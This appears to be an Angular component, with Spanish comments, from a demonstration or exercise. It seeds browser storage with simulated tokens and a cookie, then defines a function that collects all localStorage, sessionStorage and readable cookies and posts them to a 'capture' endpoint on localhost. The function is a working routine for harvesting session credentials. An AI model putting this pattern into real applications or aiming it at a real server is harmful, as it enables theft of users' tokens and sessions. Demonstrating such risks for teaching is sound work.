// src/app/app.component.ts
import { Component, OnInit } from '@angular/core';
import { HttpClient } from '@angular/common/http';

@Component({
  selector: 'app-root',
  standalone: true,
  imports: [],
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent implements OnInit {

  constructor(private http: HttpClient) {}

  ngOnInit(): void {
    // Simulación: almacenar valores en localStorage y sessionStorage
    localStorage.setItem('jwt', 'eyJhbGciOiJIUzI1NiIs...');
    sessionStorage.setItem('usuario', 'david.galarza');
    document.cookie = "tokenSesion=abc123; path=/";
  }

  capturarYEnviar(): void {
    const localStorageData: any = {};
    const sessionStorageData: any = {};

    // Capturar localStorage
    for (let i = 0; i < localStorage.length; i++) {
      const clave = localStorage.key(i);
      localStorageData[clave!] = localStorage.getItem(clave!);
    }

    // Capturar sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
      const clave = sessionStorage.key(i);
      sessionStorageData[clave!] = sessionStorage.getItem(clave!);
    }

    // Capturar cookies accesibles
    const cookies = document.cookie;

    // Armar payload
    const datos = {
      localStorage: localStorageData,
      sessionStorage: sessionStorageData,
      cookies: cookies
    };

    // Enviar al backend
    this.http.post('http://localhost:3000/capture', datos).subscribe({
      next: res => console.log('✅ Datos enviados correctamente', res),
      error: err => console.error('❌ Error al enviar datos', err)
    });
  }
}
